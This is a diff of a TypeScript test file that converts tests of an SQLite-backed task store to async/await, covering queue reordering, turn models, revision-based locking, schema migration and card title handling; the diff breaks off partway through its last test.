@@ -32,112 +32,121 @@ import { answeredCard, type RecordedFinding, type Task } from "./types.ts";
 const root = mkdtempSync(join(tmpdir(), "store-model-"));
 const opened: ProjectStore[] = [];
 /** Track every store so teardown closes them: an open SQLite file makes rmSync EBUSY on Windows. */
-const open = (dbPath: string) => {
-	const store = ProjectStore.open(dbPath);
+const open = async (dbPath: string) => {
+	const store = await ProjectStore.open(dbPath);
 	opened.push(store);
 	return store;
 };
-afterAll(() => {
-	for (const store of opened) store.close(); // double close is a no-op
+afterAll(async () => {
+	for (const store of opened) await store.close(); // double close is a no-op
 	rmSync(root, { recursive: true, force: true, maxRetries: 5 });
 });
 
 describe("reorderQueue", () => {
-	test("exact permutation moves a task to the front as queueIds reports", () => {
-		const store = open(join(root, "reorder"));
-		const a = store.createTask("a");
-		const b = store.createTask("b");
-		const c = store.createTask("c");
+	test("exact permutation moves a task to the front as queueIds reports", async () => {
+		const store = await open(join(root, "reorder"));
+		const a = await store.createTask("a");
+		const b = await store.createTask("b");
+		const c = await store.createTask("c");
 		// Distinct queuedAt so the initial order cannot depend on same-millisecond ties.
-		store.updateTask(a.id, { queuedAt: 1 });
-		store.updateTask(b.id, { queuedAt: 2 });
-		store.updateTask(c.id, { queuedAt: 3 });
-		expect(store.queueIds()).toEqual([a.id, b.id, c.id]);
-		expect(store.reorderQueue([c.id, a.id, b.id])).toBe(true);
-		expect(store.queueIds()).toEqual([c.id, a.id, b.id]);
-		store.close();
+		await store.updateTask(a.id, { queuedAt: 1 });
+		await store.updateTask(b.id, { queuedAt: 2 });
+		await store.updateTask(c.id, { queuedAt: 3 });
+		expect(await store.queueIds()).toEqual([a.id, b.id, c.id]);
+		expect(await store.reorderQueue([c.id, a.id, b.id])).toBe(true);
+		expect(await store.queueIds()).toEqual([c.id, a.id, b.id]);
+		await store.close();
 	});
 
-	test("wrong length, duplicate id, and unknown id each return false without writing", () => {
-		const store = open(join(root, "reorder-bad"));
-		const a = store.createTask("a");
-		const b = store.createTask("b");
-		store.updateTask(a.id, { queuedAt: 1 });
-		store.updateTask(b.id, { queuedAt: 2 });
-		const before = store.queueIds();
-		expect(store.reorderQueue([a.id])).toBe(false);
-		expect(store.reorderQueue([a.id, a.id])).toBe(false);
-		expect(store.reorderQueue([a.id, "nope"])).toBe(false);
-		expect(store.queueIds()).toEqual(before);
-		expect(store.reorderQueue([a.id, b.id])).toBe(true);
-		store.close();
+	test("wrong length, duplicate id, and unknown id each return false without writing", async () => {
+		const store = await open(join(root, "reorder-bad"));
+		const a = await store.createTask("a");
+		const b = await store.createTask("b");
+		await store.updateTask(a.id, { queuedAt: 1 });
+		await store.updateTask(b.id, { queuedAt: 2 });
+		const before = await store.queueIds();
+		expect(await store.reorderQueue([a.id])).toBe(false);
+		expect(await store.reorderQueue([a.id, a.id])).toBe(false);
+		expect(await store.reorderQueue([a.id, "nope"])).toBe(false);
+		expect(await store.queueIds()).toEqual(before);
+		expect(await store.reorderQueue([a.id, b.id])).toBe(true);
+		await store.close();
 	});
 });
 
 describe("turn model", () => {
-	test("finishTurn stores the model and listTurns returns it", () => {
-		const store = open(join(root, "fresh"));
-		const task = store.createTask("do things");
-		const turn = store.startTurn(task.id, "work", "do things", null);
+	test("finishTurn stores the model and listTurns returns it", async () => {
+		const store = await open(join(root, "fresh"));
+		const task = await store.createTask("do things");
+		const turn = await store.startTurn(task.id, "work", "do things", null);
 		expect(turn.model).toBeNull();
-		store.finishTurn(turn.id, {
+		await store.finishTurn(turn.id, {
 			endedAt: Date.now(),
 			model: "zai/glm-5.3-flash",
 		});
-		expect(store.listTurns(task.id)[0]?.model).toBe("zai/glm-5.3-flash");
-		store.close();
+		expect((await store.listTurns(task.id))[0]?.model).toBe(
+			"zai/glm-5.3-flash",
+		);
+		await store.close();
 	});
 
-	test("finishTurn stores ranOn and listTurns returns it", () => {
-		const store = open(join(root, "ran-on"));
-		const task = store.createTask("do things");
-		const turn = store.startTurn(task.id, "work", "do things", null);
+	test("finishTurn stores ranOn and listTurns returns it", async () => {
+		const store = await open(join(root, "ran-on"));
+		const task = await store.createTask("do things");
+		const turn = await store.startTurn(task.id, "work", "do things", null);
 		expect(turn.ranOn).toBeNull();
-		store.finishTurn(turn.id, {
+		await store.finishTurn(turn.id, {
 			endedAt: Date.now(),
 			ranOn: "worker-a (abc)",
 		});
-		expect(store.listTurns(task.id)[0]?.ranOn).toBe("worker-a (abc)");
-		store.close();
+		expect((await store.listTurns(task.id))[0]?.ranOn).toBe("worker-a (abc)");
+		await store.close();
 	});
 
-	test("openOrRecentTurns keeps open turns and turns that ended after the cutoff", () => {
+	test("openOrRecentTurns keeps open turns and turns that ended after the cutoff", async () => {
 		// OTTR-763: the checkout guard's attribution candidates. A turn whose window
 		// [startedAt, endedAt or open] cannot overlap the cutoff and later times is out.
-		const store = open(join(root, "open-or-recent"));
-		const task = store.createTask("do things");
+		const store = await open(join(root, "open-or-recent"));
+		const task = await store.createTask("do things");
 		const cutoff = Date.now();
-		const ended = store.startTurn(task.id, "work", "ended after", null);
-		store.finishTurn(ended.id, { endedAt: cutoff + 1000 });
-		const openTurn = store.startTurn(task.id, "work", "still open", null);
-		const old = store.startTurn(task.id, "work", "ended earlier", null);
-		store.finishTurn(old.id, { endedAt: cutoff - 60_000 });
+		const ended = await store.startTurn(task.id, "work", "ended after", null);
+		await store.finishTurn(ended.id, { endedAt: cutoff + 1000 });
+		const openTurn = await store.startTurn(task.id, "work", "still open", null);
+		const old = await store.startTurn(task.id, "work", "ended earlier", null);
+		await store.finishTurn(old.id, { endedAt: cutoff - 60_000 });
 
-		const ids = store.openOrRecentTurns(cutoff).map((t) => t.id);
+		const ids = (await store.openOrRecentTurns(cutoff)).map((t) => t.id);
 		expect(ids).toContain(ended.id);
 		expect(ids).toContain(openTurn.id);
 		expect(ids).not.toContain(old.id);
-		store.close();
+		await store.close();
 	});
 
-	test("lastTurnModel returns the newest turn that recorded a model", () => {
-		const store = open(join(root, "last-model"));
-		const task = store.createTask("snapshot");
-		expect(store.lastTurnModel(task.id)).toBeNull(); // nothing ran
-		const first = store.startTurn(task.id, "work", "p", null);
-		store.finishTurn(first.id, { endedAt: Date.now(), model: "a/one" });
+	test("lastTurnModel returns the newest turn that recorded a model", async () => {
+		const store = await open(join(root, "last-model"));
+		const task = await store.createTask("snapshot");
+		expect(await store.lastTurnModel(task.id)).toBeNull(); // nothing ran
+		const first = await store.startTurn(task.id, "work", "p", null);
+		await store.finishTurn(first.id, { endedAt: Date.now(), model: "a/one" });
 		// A running turn records its dispatch model at start, so the chip states it while it runs.
-		const second = store.startTurn(task.id, "work", "p", null, null, "a/two");
-		expect(store.lastTurnModel(task.id)).toBe("a/two");
-		store.finishTurn(second.id, { endedAt: Date.now(), model: "a/two" });
-		expect(store.lastTurnModel(task.id)).toBe("a/two");
+		const second = await store.startTurn(
+			task.id,
+			"work",
+			"p",
+			null,
+			null,
+			"a/two",
+		);
+		expect(await store.lastTurnModel(task.id)).toBe("a/two");
+		await store.finishTurn(second.id, { endedAt: Date.now(), model: "a/two" });
+		expect(await store.lastTurnModel(task.id)).toBe("a/two");
 		// A running turn without a model leaves the last recorded one standing.
-		store.startTurn(task.id, "work", "p", null);
-		expect(store.lastTurnModel(task.id)).toBe("a/two");
-		store.close();
+		await store.startTurn(task.id, "work", "p", null);
+		expect(await store.lastTurnModel(task.id)).toBe("a/two");
+		await store.close();
 	});
 
-	test("open backfills turns.model on a pre-existing database", () => {
+	test("open backfills turns.model on a pre-existing database", async () => {
 		const dir = join(root, "legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -146,70 +155,97 @@ describe("turn model", () => {
 			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.createTask("legacy");
-		const turn = store.startTurn(task.id, "work", "legacy", null);
-		store.finishTurn(turn.id, { model: "openai/gpt-5" });
-		expect(store.listTurns(task.id)[0]?.model).toBe("openai/gpt-5");
-		store.close();
+		const store = await open(dir);
+		const task = await store.createTask("legacy");
+		const turn = await store.startTurn(task.id, "work", "legacy", null);
+		await store.finishTurn(turn.id, { model: "openai/gpt-5" });
+		expect((await store.listTurns(task.id))[0]?.model).toBe("openai/gpt-5");
+		await store.close();
 	});
 });
 
 describe("boardCardFacts", () => {
 	// The batched read must return the same facts the per-task calls report, for every
 	// card shape the board shows (OTTR-721).
-	test("batched facts match the per-task reads", () => {
-		const store = open(join(root, "board-facts"));
+	test("batched facts match the per-task reads", async () => {
+		const store = await open(join(root, "board-facts"));
 		// Running: a work turn is still open and carries its dispatch model.
-		const running = store.createTask("running card");
-		store.startTurn(running.id, "work", "running card", null, null, "a/live");
+		const running = await store.createTask("running card");
+		await store.startTurn(
+			running.id,
+			"work",
+			"running card",
+			null,
+			null,
+			"a/live",
+		);
 		// Done and answered: the newest work turn reported "answered".
-		const answered = store.createTask("answered card");
-		const a1 = store.startTurn(answered.id, "work", "answered card", null);
-		store.finishTurn(a1.id, {
+		const answered = await store.createTask("answered card");
+		const a1 = await store.startTurn(
+			answered.id,
+			"work",
+			"answered card",
+			null,
+		);
+		await store.finishTurn(a1.id, {
 			endedAt: Date.now(),
 			outcome: "ready",
 			model: "a/one",
 		});
-		const a2 = store.startTurn(answered.id, "work", "answered card", null);
-		store.finishTurn(a2.id, {
+		const a2 = await store.startTurn(
+			answered.id,
+			"work",
+			"answered card",
+			null,
+		);
+		await store.finishTurn(a2.id, {
 			endedAt: Date.now(),
 			outcome: "answered",
 			model: "a/two",
 		});
-		store.updateTask(answered.id, { stage: "done" });
+		await store.updateTask(answered.id, { stage: "done" });
 		// Done but not answered: a later work turn replaces the answered one.
-		const notAnswered = store.createTask("not answered card");
-		const n1 = store.startTurn(notAnswered.id, "work", "not answered", null);
-		store.finishTurn(n1.id, { endedAt: Date.now(), outcome: "answered" });
-		const n2 = store.startTurn(notAnswered.id, "work", "not answered", null);
-		store.finishTurn(n2.id, {
+		const notAnswered = await store.createTask("not answered card");
+		const n1 = await store.startTurn(
+			notAnswered.id,
+			"work",
+			"not answered",
+			null,
+		);
+		await store.finishTurn(n1.id, { endedAt: Date.now(), outcome: "answered" });
+		const n2 = await store.startTurn(
+			notAnswered.id,
+			"work",
+			"not answered",
+			null,
+		);
+		await store.finishTurn(n2.id, {
 			endedAt: Date.now(),
 			outcome: "ready",
 			model: "a/three",
 		});
-		store.updateTask(notAnswered.id, { stage: "done" });
+		await store.updateTask(notAnswered.id, { stage: "done" });
 		// No turns at all.
-		const silent = store.createTask("never ran");
+		const silent = await store.createTask("never ran");
 
-		const facts = store.boardCardFacts();
-		for (const t of store.listTasks()) {
+		const facts = await store.boardCardFacts();
+		for (const t of await store.listTasks()) {
 			const tf = facts.turns.get(t.id);
 			// The map is total over the task rows: a turn-less task reads as all-null.
 			expect(tf).toBeDefined();
-			const turns = store.listTurns(t.id);
+			const turns = await store.listTurns(t.id);
 			const live = turns.find((x) => x.endedAt === null);
 			expect(tf?.openTurn ?? null).toEqual(
 				live === undefined
 					? null
 					: { startedAt: live.startedAt, kind: live.kind, model: live.model },
 			);
-			expect(tf?.lastModel ?? null).toBe(store.lastTurnModel(t.id));
+			expect(tf?.lastModel ?? null).toBe(await store.lastTurnModel(t.id));
 			expect(tf?.lastWorkOutcome === "answered").toBe(answeredCard(turns));
 			// The batched card title equals frozenTitle for every title source.
-			expect(store.frozenTitleFrom(t, facts.titles.get(t.id) ?? null)).toBe(
-				store.frozenTitle(t),
-			);
+			expect(
+				await store.frozenTitleFrom(t, facts.titles.get(t.id) ?? null),
+			).toBe(await store.frozenTitle(t));
 		}
 		// Targeted reads for the four shapes the board shows.
 		expect(facts.turns.get(running.id)!.openTurn).toEqual({
@@ -231,55 +267,57 @@ describe("boardCardFacts", () => {
 			lastWorkOutcome: null,
 		});
 		// Titles ship raw; the stored value arrives for the named task only.
-		store.nameTask(silent.id, "**Named by the tracker**");
-		expect(store.boardCardFacts().titles.get(silent.id)).toBe(
+		await store.nameTask(silent.id, "**Named by the tracker**");
+		expect((await store.boardCardFacts()).titles.get(silent.id)).toBe(
 			"**Named by the tracker**",
 		);
-		store.close();
+		await store.close();
 	});
 
-	test("a title found in the transcript persists once through frozenTitleFrom", () => {
-		const store = open(join(root, "board-facts-persist"));
-		const task = store.createTask("unnamed card");
-		const facts = store.boardCardFacts();
+	test("a title found in the transcript persists once through frozenTitleFrom", async () => {
+		const store = await open(join(root, "board-facts-persist"));
+		const task = await store.createTask("unnamed card");
+		const facts = await store.boardCardFacts();
 		// No stored title anywhere: the fallback is the short prompt cut, never persisted.
 		expect(facts.titles.get(task.id) ?? null).toBeNull();
-		expect(store.frozenTitleFrom(task, facts.titles.get(task.id) ?? null)).toBe(
-			shortTitle("unnamed card"),
-		);
-		store.nameTask(task.id, "**Named once**");
-		// The batched read now carries the raw stored title; cleaning stays on read.
-		expect(store.boardCardFacts().titles.get(task.id)).toBe("**Named once**");
 		expect(
-			store.frozenTitleFrom(
-				store.getTask(task.id)!,
-				store.boardCardFacts().titles.get(task.id) ?? null,
+			await store.frozenTitleFrom(task, facts.titles.get(task.id) ?? null),
+		).toBe(shortTitle("unnamed card"));
+		await store.nameTask(task.id, "**Named once**");
+		// The batched read now carries the raw stored title; cleaning stays on read.
+		expect((await store.boardCardFacts()).titles.get(task.id)).toBe(
+			"**Named once**",
+		);
+		expect(
+			await store.frozenTitleFrom(
+				(await store.getTask(task.id))!,
+				(await store.boardCardFacts()).titles.get(task.id) ?? null,
 			),
 		).toBe("Named once");
-		store.close();
+		await store.close();
 	});
 });
 
 describe("editTask", () => {
-	test("replaces the prompt and re-derives the title from the new first line", () => {
-		const store = open(join(root, "editable"));
-		const task = store.createTask("first line\nsecond line");
+	test("replaces the prompt and re-derives the title from the new first line", async () => {
+		const store = await open(join(root, "editable"));
+		const task = await store.createTask("first line\nsecond line");
 		expect(task.title).toBe("first line");
-		const edited = store.editTask(task.id, "renamed lead\nnew body");
+		const edited = await store.editTask(task.id, "renamed lead\nnew body");
 		expect(edited.ok).toBe(true);
 		expect(edited.task.prompt).toBe("renamed lead\nnew body");
 		expect(edited.task.title).toBe("renamed lead");
 		expect(edited.task.stage).toBe("todo");
-		store.close();
+		await store.close();
 	});
 });
 
 describe("revision (optimistic locking)", () => {
-	test("a write with the current revision passes and moves the revision", () => {
-		const store = open(join(root, "revision-current"));
-		const task = store.createTask("original prompt");
+	test("a write with the current revision passes and moves the revision", async () => {
+		const store = await open(join(root, "revision-current"));
+		const task = await store.createTask("original prompt");
 		expect(task.revision).toBe(1);
-		const result = store.updateTaskIfCurrent(
+		const result = await store.updateTaskIfCurrent(
 			task.id,
 			{ prompt: "edit one" },
 			1,
@@ -287,64 +325,64 @@ describe("revision (optimistic locking)", () => {
 		expect(result.ok).toBe(true);
 		expect(result.task.revision).toBe(2);
 		expect(result.task.prompt).toBe("edit one");
-		store.close();
+		await store.close();
 	});
 
-	test("the prompt-edit hold claim is guarded and contentless", () => {
-		const store = open(join(root, "hold-claim-current"));
-		const task = store.createTask("original prompt");
-		const rev = store.getTask(task.id)!.revision;
-		const result = store.claimPromptHold(task.id, 12345, rev);
+	test("the prompt-edit hold claim is guarded and contentless", async () => {
+		const store = await open(join(root, "hold-claim-current"));
+		const task = await store.createTask("original prompt");
+		const rev = (await store.getTask(task.id))!.revision;
+		const result = await store.claimPromptHold(task.id, 12345, rev);
 		expect(result.ok).toBe(true);
 		expect(result.task.holdUntil).toBe(12345);
 		// The hold is bookkeeping, not content: the revision the editor armed its
 		// save from stays current, so the save never 409s against its own claim.
 		expect(result.task.revision).toBe(rev);
-		expect(store.getTask(task.id)!.revision).toBe(rev);
-		store.close();
+		expect((await store.getTask(task.id))!.revision).toBe(rev);
+		await store.close();
 	});
 
-	test("a stale prompt-edit hold claim conflicts without writing", () => {
-		const store = open(join(root, "hold-claim-stale"));
-		const task = store.createTask("original prompt");
+	test("a stale prompt-edit hold claim conflicts without writing", async () => {
+		const store = await open(join(root, "hold-claim-stale"));
+		const task = await store.createTask("original prompt");
 		// Another tab's content edit lands between this editor's load and its claim.
-		store.updateTask(task.id, { prompt: "first edit" });
-		const result = store.claimPromptHold(task.id, 12345, 1);
+		await store.updateTask(task.id, { prompt: "first edit" });
+		const result = await store.claimPromptHold(task.id, 12345, 1);
 		expect(result.ok).toBe(false);
 		expect(result.task.prompt).toBe("first edit");
 		// The stale draft must not arm, and the hold must not land.
 		expect(result.task.holdUntil).toBeNull();
-		expect(store.getTask(task.id)!.holdUntil).toBeNull();
-		store.close();
+		expect((await store.getTask(task.id))!.holdUntil).toBeNull();
+		await store.close();
 	});
 
-	test("releasing the prompt-edit hold is contentless too", () => {
-		const store = open(join(root, "hold-release"));
-		const task = store.createTask("original prompt");
-		const rev = store.getTask(task.id)!.revision;
-		store.claimPromptHold(task.id, 12345, rev);
-		store.releasePromptHold(task.id);
-		const after = store.getTask(task.id) as Task;
+	test("releasing the prompt-edit hold is contentless too", async () => {
+		const store = await open(join(root, "hold-release"));
+		const task = await store.createTask("original prompt");
+		const rev = (await store.getTask(task.id))!.revision;
+		await store.claimPromptHold(task.id, 12345, rev);
+		await store.releasePromptHold(task.id);
+		const after = (await store.getTask(task.id)) as Task;
 		expect(after.holdUntil).toBeNull();
 		expect(after.holdProvider).toBeNull();
 		expect(after.holdWindow).toBeNull();
 		expect(after.revision).toBe(rev);
-		store.close();
+		await store.close();
 	});
 
-	test("a write with a stale revision changes nothing and reports the conflict with the current row", () => {
-		const store = open(join(root, "revision-stale"));
-		const task = store.createTask("original prompt");
+	test("a write with a stale revision changes nothing and reports the conflict with the current row", async () => {
+		const store = await open(join(root, "revision-stale"));
+		const task = await store.createTask("original prompt");
 		// First writer wins: bumps the row to revision 2 with its own prompt and updated_at.
-		const first = store.updateTaskIfCurrent(
+		const first = await store.updateTaskIfCurrent(
 			task.id,
 			{ prompt: "first edit" },
 			1,
 		);
 		expect(first.ok).toBe(true);
-		const winner = store.getTask(task.id) as Task;
+		const winner = (await store.getTask(task.id)) as Task;
 		// Second tab still holds revision 1: the write must not land.
-		const second = store.updateTaskIfCurrent(
+		const second = await store.updateTaskIfCurrent(
 			task.id,
 			{ prompt: "second edit" },
 			1,
@@ -352,47 +390,47 @@ describe("revision (optimistic locking)", () => {
 		expect(second.ok).toBe(false);
 		expect(second.task).toEqual(winner);
 		// The first writer's values survive untouched.
-		const row = store.getTask(task.id) as Task;
+		const row = (await store.getTask(task.id)) as Task;
 		expect(row.prompt).toBe("first edit");
 		expect(row.updatedAt).toBe(winner.updatedAt);
 		expect(row.revision).toBe(2);
-		store.close();
+		await store.close();
 	});
 
-	test("an internal updateTask always passes and bumps the revision", () => {
-		const store = open(join(root, "revision-internal"));
-		const task = store.createTask("internal");
-		store.updateTask(task.id, { summary: "one" });
-		expect(store.getTask(task.id)?.revision).toBe(2);
-		store.updateTask(task.id, { summary: "two" });
-		expect(store.getTask(task.id)?.revision).toBe(3);
-		store.close();
+	test("an internal updateTask always passes and bumps the revision", async () => {
+		const store = await open(join(root, "revision-internal"));
+		const task = await store.createTask("internal");
+		await store.updateTask(task.id, { summary: "one" });
+		expect((await store.getTask(task.id))?.revision).toBe(2);
+		await store.updateTask(task.id, { summary: "two" });
+		expect((await store.getTask(task.id))?.revision).toBe(3);
+		await store.close();
 	});
 
-	test("editTask passes with the current revision and conflicts with a stale one", () => {
-		const store = open(join(root, "revision-edit"));
-		const task = store.createTask("first line\nsecond line");
-		const current = store.editTask(task.id, "renamed lead\nnew body", 1);
+	test("editTask passes with the current revision and conflicts with a stale one", async () => {
+		const store = await open(join(root, "revision-edit"));
+		const task = await store.createTask("first line\nsecond line");
+		const current = await store.editTask(task.id, "renamed lead\nnew body", 1);
 		expect(current.ok).toBe(true);
 		expect(current.task.title).toBe("renamed lead");
 		expect(current.task.revision).toBe(2);
 		// The stale editor's revision 1 no longer matches.
-		const stale = store.editTask(task.id, "lost edit", 1);
+		const stale = await store.editTask(task.id, "lost edit", 1);
 		expect(stale.ok).toBe(false);
 		expect(stale.task.prompt).toBe("renamed lead\nnew body");
-		expect((store.getTask(task.id) as Task).revision).toBe(2);
-		store.close();
+		expect(((await store.getTask(task.id)) as Task).revision).toBe(2);
+		await store.close();
 	});
 
-	test("an unknown id still throws before any write", () => {
-		const store = open(join(root, "revision-unknown"));
-		expect(() => store.updateTaskIfCurrent("nope", { prompt: "x" }, 1)).toThrow(
-			"unknown task: nope",
-		);
-		store.close();
+	test("an unknown id still throws before any write", async () => {
+		const store = await open(join(root, "revision-unknown"));
+		await expect(
+			store.updateTaskIfCurrent("nope", { prompt: "x" }, 1),
+		).rejects.toThrow("unknown task: nope");
+		await store.close();
 	});
 
-	test("an old-schema database without the column converges on open and starts writing revisions", () => {
+	test("an old-schema database without the column converges on open and starts writing revisions", async () => {
 		const dir = join(root, "revision-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -434,26 +472,30 @@ describe("revision (optimistic locking)", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// The seeded row survives and reads the default revision.
-		const seeded = store.getTask("seed1") as Task;
+		const seeded = (await store.getTask("seed1")) as Task;
 		expect(seeded.title).toBe("seeded");
 		expect(seeded.revision).toBe(1);
 		// The first write moves the revision.
-		const result = store.updateTaskIfCurrent("seed1", { prompt: "edited" }, 1);
+		const result = await store.updateTaskIfCurrent(
+			"seed1",
+			{ prompt: "edited" },
+			1,
+		);
 		expect(result.ok).toBe(true);
 		expect(result.task.revision).toBe(2);
 		// No duplicate column on the next open: convergence is done.
-		store.close();
-		const reopened = open(dir);
-		expect((reopened.getTask("seed1") as Task).revision).toBe(2);
-		reopened.close();
+		await store.close();
+		const reopened = await open(dir);
+		expect(((await reopened.getTask("seed1")) as Task).revision).toBe(2);
+		await reopened.close();
 	});
 });
 
 describe("deriveTitle", () => {
-	test("skips section labels and strips heading marks", () => {
-		const store = open(join(root, "derive-title"));
+	test("skips section labels and strips heading marks", async () => {
+		const store = await open(join(root, "derive-title"));
 		const cases: Array<[string, string]> = [
 			["# Goal\n\nFix the login redirect\nmore", "Fix the login redirect"],
 			["# Set up agent rules for demo\nbody", "Set up agent rules for demo"],
@@ -466,17 +508,17 @@ describe("deriveTitle", () => {
 			],
 		];
 		for (const [prompt, title] of cases)
-			expect(store.createTask(prompt).title).toBe(title);
-		store.close();
+			expect((await store.createTask(prompt)).title).toBe(title);
+		await store.close();
 	});
 
-	test("edited cards re-derive with section labels skipped", () => {
-		const store = open(join(root, "derive-title-edit"));
-		const task = store.createTask("# Goal\nfirst title");
+	test("edited cards re-derive with section labels skipped", async () => {
+		const store = await open(join(root, "derive-title-edit"));
+		const task = await store.createTask("# Goal\nfirst title");
 		expect(task.title).toBe("first title");
-		const edited = store.editTask(task.id, "# Goal\nsecond title");
+		const edited = await store.editTask(task.id, "# Goal\nsecond title");
 		expect(edited.task.title).toBe("second title");
-		store.close();
+		await store.close();
 	});
 });
 
@@ -490,95 +532,153 @@ describe("asked", () => {
 		},
 	];
 
-	test("updateTask stores the ask and getTask parses it back", () => {
-		const store = open(join(root, "asked"));
-		const task = store.createTask("do things");
-		expect(store.getTask(task.id)?.asked).toBeNull();
-		store.updateTask(task.id, { asked: ask });
-		expect(store.getTask(task.id)?.asked).toEqual(ask);
-		store.close();
+	test("updateTask stores the ask and getTask parses it back", async () => {
+		const store = await open(join(root, "asked"));
+		const task = await store.createTask("do things");
+		expect((await store.getTask(task.id))?.asked).toBeNull();
+		await store.updateTask(task.id, { asked: ask });
+		expect((await store.getTask(task.id))?.asked).toEqual(ask);
+		await store.close();
 	});
 
-	test("null clears and corrupt JSON parses back as null instead of throwing", () => {
-		const store = open(join(root, "asked-bad"));
-		const task = store.createTask("do things");
-		store.updateTask(task.id, { asked: "{not json" as unknown as typeof ask });
-		expect(store.getTask(task.id)?.asked).toBeNull();
-		store.updateTask(task.id, { asked: null });
-		expect(store.getTask(task.id)?.asked).toBeNull();
-		store.close();
+	test("null clears and corrupt JSON parses back as null instead of throwing", async () => {
+		const store = await open(join(root, "asked-bad"));
+		const task = await store.createTask("do things");
+		await store.updateTask(task.id, {
+			asked: "{not json" as unknown as typeof ask,
+		});
+		expect((await store.getTask(task.id))?.asked).toBeNull();
+		await store.updateTask(task.id, { asked: null });
+		expect((await store.getTask(task.id))?.asked).toBeNull();
+		await store.close();
 	});
 });
 
 describe("frozenTitle", () => {
-	test("persists the session's first title once; a later rewrite cannot rename the card", () => {
-		const store = open(join(root, "frozen-title"));
+	test("persists the session's first title once; a later rewrite cannot rename the card", async () => {
+		const store = await open(join(root, "frozen-title"));
 		const sid = "bbbb0000-0000-0000-0000-000000000101";
-		const task = store.updateTask(store.createTask("still untitled").id, {
-			sessionId: sid,
-		});
-		expect(store.frozenTitle(task)).toBe(shortTitle("still untitled")); // no session file yet: prompt-line fallback
+		const task = await store.updateTask(
+			(await store.createTask("still untitled")).id,
+			{
+				sessionId: sid,
+			},
+		);
+		expect(await store.frozenTitle(task)).toBe(shortTitle("still untitled")); // no session file yet: prompt-line fallback
 		mkdirSync(store.sessionsDir, { recursive: true });
 		writeFileSync(
 			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
 			'{"type":"title","v":1,"title":"Persisted"}\n{"type":"session"}\n{"type":"title_change","title":"Persisted"}\n',
 		);
-		expect(store.frozenTitle(task)).toBe("Persisted");
+		expect(await store.frozenTitle(task)).toBe("Persisted");
 		writeFileSync(
 			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
 			'{"type":"title","v":1,"title":"Renamed"}\n{"type":"session"}\n{"type":"title_change","title":"Renamed"}\n',
 		);
-		expect(store.frozenTitle(task)).toBe("Persisted"); // the first write stays authoritative
-		store.close();
+		expect(await store.frozenTitle(task)).toBe("Persisted"); // the first write stays authoritative
+		await store.close();
 	});
 
-	test("a Markdown-wrapped title displays and persists clean, from transcript and stored row", () => {
-		const store = open(join(root, "frozen-title-markdown"));
+	test("a Markdown-wrapped title displays and persists clean, from transcript and stored row", async () => {
+		const store = await open(join(root, "frozen-title-markdown"));
 		const sid = "bbbb0000-0000-0000-0000-000000000201";
-		const task = store.updateTask(store.createTask("still untitled").id, {
-			sessionId: sid,
-		});
+		const task = await store.updateTask(
+			(await store.createTask("still untitled")).id,
+			{
+				sessionId: sid,
+			},
+		);
 		mkdirSync(store.sessionsDir, { recursive: true });
 		writeFileSync(
 			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
 			'{"type":"title","v":1,"title":"**Task Name: OTTR-292**"}\n{"type":"session"}\n{"type":"title_change","title":"**Task Name: OTTR-292**"}\n',
 		);
-		expect(store.frozenTitle(task)).toBe("Task Name: OTTR-292");
+		expect(await store.frozenTitle(task)).toBe("Task Name: OTTR-292");
 
 		// A row written dirty before the cleaning reads clean too — no migration needed.
-		const legacy = store.createTask("legacy dirty row");
-		store.nameTask(legacy.id, "**Task Name: OTTR-292**");
-		expect(store.sessionTitle(store.getTask(legacy.id)!)).toBe(
+		const legacy = await store.createTask("legacy dirty row");
+		await store.nameTask(legacy.id, "**Task Name: OTTR-292**");
+		expect(await store.sessionTitle((await store.getTask(legacy.id))!)).toBe(
 			"Task Name: OTTR-292",
 		);
-		store.close();
+		await store.close();
 	});
 
-	test("a pending title retry holds the transcript title back; the prefix never displays", () => {
-		const store = open(join(root, "frozen-title-hold"));
+	test("a pending title retry holds the transcript title back; the prefix never displays", async () => {
+		const store = await open(join(root, "frozen-title-hold"));
 		const sid = "bbbb0000-0000-0000-0000-000000000301";
-		const task = store.updateTask(store.createTask("still untitled").id, {
-			sessionId: sid,
-		});
+		const task = await store.updateTask(
+			(await store.createTask("still untitled")).id,
+			{
+				sessionId: sid,
+			},
+		);
 		mkdirSync(store.sessionsDir, { recursive: true });
 		writeFileSync(
 			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
 			'{"type":"title","v":1,"title":"🩻 SKELE: Prefixed name"}\n{"type":"session"}\n{"type":"title_change","title":"🩻 SKELE: Prefixed name"}\n',
 		);
-		store.holdTitle(task.id, () => {});
+		await store.holdTitle(task.id, () => {});
 		// While the generation retry is pending, the transcript title stays unused.
-		expect(store.sessionTitle(task)).toBeNull();
-		expect(store.frozenTitle(task)).toBe(shortTitle("still untitled"));
+		expect(await store.sessionTitle(task)).toBeNull();
+		expect(await store.frozenTitle(task)).toBe(shortTitle("still untitled"));
 		// The retry settled: the hold ends and the transcript title names the card, clean.
-		expect(store.releaseTitleHold(task.id)).toBe(true);
-		expect(store.frozenTitle(task)).toBe("Prefixed name");
-		expect(store.releaseTitleHold(task.id)).toBe(false); // already released
-		store.close();
+		expect(await store.releaseTitleHold(task.id)).toBe(true);
+		expect(await store.frozenTitle(task)).toBe("Prefixed name");
+		expect(await store.releaseTitleHold(task.id)).toBe(false); // already released
+		await store.close();
+	});
+
+	test("title cleanup and path helpers remain async after database close", async () => {
+		const store = await open(join(root, "title-cleanup-after-close"));
+		const task = await store.createTask("title retry");
+		const cancelled: string[] = [];
+		const initialHold = store.holdTitle(task.id, () => {
+			cancelled.push("initial");
+		});
+		expect(initialHold).toBeInstanceOf(Promise);
+		await initialHold;
+		expect(await store.titleHold(task.id)).toBe(true);
+		await store.close();
